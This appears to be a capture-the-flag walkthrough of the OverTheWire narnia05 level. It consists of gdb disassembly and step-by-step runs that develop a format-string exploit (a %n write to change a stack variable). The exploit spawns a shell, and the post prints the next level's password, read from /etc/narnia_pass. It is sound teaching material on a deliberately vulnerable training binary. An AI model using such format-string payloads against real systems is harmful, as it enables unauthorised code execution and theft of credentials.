+++
title = "Over the wire - narnia05"
description = "Walk-through"
date ="2016-03-09"
draft = true
publishdate ="2016-03-09"
categories = ["security"]
tags = ["assembly", "linux", "binary"]
slug =  "over-the-wire-narnia-05"
project_url = "https://greyhat.dk/over-the-wire-narnia-05"
type = "post"
+++



(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
   0x080484bd <+0>:	push   ebp
   0x080484be <+1>:	mov    ebp,esp
   0x080484c0 <+3>:	and    esp,0xfffffff0
   0x080484c3 <+6>:	sub    esp,0x60
   0x080484c6 <+9>:	mov    DWORD PTR [esp+0x5c],0x1
   0x080484ce <+17>:	mov    eax,DWORD PTR [ebp+0xc]
   0x080484d1 <+20>:	add    eax,0x4
   0x080484d4 <+23>:	mov    eax,DWORD PTR [eax]
   0x080484d6 <+25>:	mov    DWORD PTR [esp+0x8],eax
   0x080484da <+29>:	mov    DWORD PTR [esp+0x4],0x40
   0x080484e2 <+37>:	lea    eax,[esp+0x1c]
   0x080484e6 <+41>:	mov    DWORD PTR [esp],eax
   0x080484e9 <+44>:	call   0x80483b0 <snprintf@plt>
   0x080484ee <+49>:	mov    BYTE PTR [esp+0x5b],0x0
   0x080484f3 <+54>:	mov    DWORD PTR [esp],0x8048610
   0x080484fa <+61>:	call   0x8048350 <printf@plt>
   0x080484ff <+66>:	mov    eax,DWORD PTR [esp+0x5c]
   0x08048503 <+70>:	cmp    eax,0x1f4
   0x08048508 <+75>:	jne    0x8048522 <main+101>
   0x0804850a <+77>:	mov    DWORD PTR [esp],0x8048631
   0x08048511 <+84>:	call   0x8048360 <puts@plt>
   0x08048516 <+89>:	mov    DWORD PTR [esp],0x8048636
   0x0804851d <+96>:	call   0x8048370 <system@plt>
   0x08048522 <+101>:	mov    DWORD PTR [esp],0x8048640
   0x08048529 <+108>:	call   0x8048360 <puts@plt>
   0x0804852e <+113>:	lea    eax,[esp+0x1c]
   0x08048532 <+117>:	mov    DWORD PTR [esp],eax
   0x08048535 <+120>:	call   0x8048390 <strlen@plt>
   0x0804853a <+125>:	mov    DWORD PTR [esp+0x8],eax
   0x0804853e <+129>:	lea    eax,[esp+0x1c]
   0x08048542 <+133>:	mov    DWORD PTR [esp+0x4],eax
   0x08048546 <+137>:	mov    DWORD PTR [esp],0x8048661
   0x0804854d <+144>:	call   0x8048350 <printf@plt>
   0x08048552 <+149>:	mov    eax,DWORD PTR [esp+0x5c]
   0x08048556 <+153>:	lea    edx,[esp+0x5c]
   0x0804855a <+157>:	mov    DWORD PTR [esp+0x8],edx
   0x0804855e <+161>:	mov    DWORD PTR [esp+0x4],eax
   0x08048562 <+165>:	mov    DWORD PTR [esp],0x8048675
   0x08048569 <+172>:	call   0x8048350 <printf@plt>
   0x0804856e <+177>:	mov    eax,0x0
   0x08048573 <+182>:	leave
   0x08048574 <+183>:	ret
End of assembler dump.
(gdb)
(gdb) r AAAA%x%x%x%x%x
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /games/narnia/narnia5 AAAA%x%x%x%x%x
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [AAAAf7eb85b6ffffffffffffd68ef7e30bf841414141] (44)
i = 1 (0xffffd6ac)
[Inferior 1 (process 18256) exited normally]
(gdb) r $(python -c 'print "AAAA\xbc\xd6\xff\xff%x%x%x%x%x"')
Starting program: /games/narnia/narnia5 $(python -c 'print "AAAA\xbc\xd6\xff\xff%x%x%x%x%x"')
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [AAAA����f7eb85b6ffffffffffffd68ef7e30bf841414141] (48)
i = 1 (0xffffd6ac)
[Inferior 1 (process 18739) exited normally]
(gdb) r $(python -c 'print "AAAA\xac\xd6\xff\xff%x%x%x%x%x"')
Starting program: /games/narnia/narnia5 $(python -c 'print "AAAA\xac\xd6\xff\xff%x%x%x%x%x"')
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [AAAA����f7eb85b6ffffffffffffd68ef7e30bf841414141] (48)
i = 1 (0xffffd6ac)
[Inferior 1 (process 19175) exited normally]
(gdb) r $(python -c 'print "AAAA\xac\xd6\xff\xff%x%x%x%x%500d%n"')
Starting program: /games/narnia/narnia5 $(python -c 'print "AAAA\xac\xd6\xff\xff%x%x%x%x%500d%n"')
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [AAAA����f7eb85b6ffffffffffffd68ef7e30bf8                       ] (63)
i = 540 (0xffffd6ac)
[Inferior 1 (process 19434) exited normally]
(gdb) r $(python -c 'print "AAAA\xac\xd6\xff\xff%x%x%x%x%460d%n"')
Starting program: /games/narnia/narnia5 $(python -c 'print "AAAA\xac\xd6\xff\xff%x%x%x%x%460d%n"')
Change i's value from 1 -> 500. GOOD
$
No way...let me give you a hint!
buffer : [AAAA����f7eb85b6ffffffffffffd68ef7e30bf8                       ] (63)
i = 500 (0xffffd6ac)
[Inferior 1 (process 19616) exited normally]
(gdb) quit
narnia5@melinda:/narnia$ /games/narnia/narnia5 $(python -c 'print "AAAA\xac\xd6\xff\xff%x%x%x%x%460d%n"')
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [AAAA����f7eb85b6ffffffffffffd67ef7e30bf8                       ] (63)
i = 1 (0xffffd69c)
Segmentation fault
narnia5@melinda:/narnia$ /narnia/narnia5 $(python -c 'print "AAAA\xac\xd6\xff\xff%x%x%x%x%460d%n"')
Change i's value from 1 -> 500. GOOD
$ cat /etc/narnia_pass/narnia6
neezocaeng
